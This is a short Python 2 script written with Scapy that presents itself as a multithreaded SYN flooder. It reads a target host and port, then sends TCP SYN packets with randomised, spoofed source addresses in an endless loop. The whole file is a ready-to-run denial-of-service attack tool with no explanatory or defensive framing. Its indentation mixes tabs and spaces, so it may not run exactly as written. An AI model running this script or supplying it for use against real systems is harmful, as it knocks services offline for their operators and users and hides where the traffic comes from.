from scapy.all import *
import sys,socket,threading,random

print '#########################################'
print '#SYN_FLOOD - A Multithreaded SYN FLOODER#'
print '#\t\tAuthor: VinhNgo \t#'
print '#########################################'

if len(sys.argv)!=3:
	print'Usage {} <Target> <Port>'.format(sys.argv[0])
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

total = 0
class synFlood(threading.Thread):
        global target, port
        def __init__(self):
                threading.Thread.__init__(self)
	def addr_rand(self):
		addr = "{}.{}.{}.{}".format(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		return addr        
	def run(self):
		ip = IP(src=self.addr_rand(),dst=target)
		tcp = TCP(sport=random.randint(1,65535),dport=port,flags="S")
		p = ip/tcp
		send(p,verbose=0)

print 'Flooding {}:{} with SYN packets.'.format(target,port)
while 1:
	synFlood().start()
	total+=1
	sys.stdout.write('\rTotal packets sent:\t\t {}'.format(total))
print"TCP Dos Complete!"